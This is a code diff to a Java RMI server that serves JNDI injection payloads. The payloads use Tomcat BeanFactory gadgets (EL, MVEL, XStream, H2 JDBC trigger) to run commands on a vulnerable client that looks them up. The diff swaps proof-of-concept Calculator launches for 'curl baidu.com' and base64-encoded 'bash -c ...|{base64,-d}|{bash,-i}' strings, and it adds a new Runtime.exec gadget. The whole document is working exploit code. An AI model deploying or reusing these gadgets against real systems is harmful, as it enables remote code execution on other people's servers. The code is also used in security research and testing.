@@ -16,7 +16,14 @@ public class RmiServer {
     public static ReferenceWrapper tomcat_EL() throws RemoteException, NamingException {
         ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
         ref.add(new StringRefAddr("forceString", "x=eval"));
-        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/usr/bin/open','/System/Applications/Calculator.app']).start()\")"));
+        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['curl','baidu.com']).start()\")"));
+        return new ReferenceWrapper(ref);
+    }
+
+    public static ReferenceWrapper tomcat_EL_Runtime() throws RemoteException, NamingException {
+        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
+        ref.add(new StringRefAddr("forceString", "x=eval"));
+        ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"open -a Calculator.app\")"));
         return new ReferenceWrapper(ref);
     }
 
@@ -94,7 +101,7 @@ public class RmiServer {
                 "        </probes>\n" +
                 "      </handler>\n" +
                 "    </dynamic-proxy>\n" +
-                "    <string>/System/Applications/Calculator.app/Contents/MacOS/Calculator</string>\n" +
+                "    <string>bash -c {echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==}|{base64,-d}|{bash,-i}</string>\n" +
                 "  </java.util.PriorityQueue>\n" +
                 "</java.util.PriorityQueue>";
         ref.add(new StringRefAddr("forceString", "a=fromXML"));
@@ -103,11 +110,11 @@ public class RmiServer {
     }
 
     private static ReferenceWrapper tomcat_MVEL() throws RemoteException, NamingException {
-        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
+    ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
                 true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "a=exec"));
         ref.add(new StringRefAddr("a",
-                "push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');"));
+                "Runtime.getRuntime().exec('bash -c {echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==}|{base64,-d}|{bash,-i}');"));
         return new ReferenceWrapper(ref);
     }
 
@@ -144,7 +151,7 @@ public class RmiServer {
         Reference ref = new Reference("javax.sql.DataSource",factory,null);
         String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                 "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
-                "java.lang.Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')\n" +
+                "java.lang.Runtime.getRuntime().exec('bash -c {echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==}|{base64,-d}|{bash,-i}')\n" +
                 "$$\n";
         ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
         ref.add(new StringRefAddr("url",JDBC_URL));
@@ -180,6 +187,7 @@ public class RmiServer {
         System.setProperty("java.rmi.server.hostname","0.0.0.0");
 
         registry.bind("tomcat_el",RmiServer.tomcat_EL());
+        registry.bind("tomcat_el_runtime",RmiServer.tomcat_EL_Runtime());
         registry.bind("tomcat_groovy",RmiServer.tomcat_groovy());
         registry.bind("tomcat_snakeyaml",RmiServer.tomcat_snakeyaml());
         registry.bind("tomcat_xstream",RmiServer.tomcat_xstream());
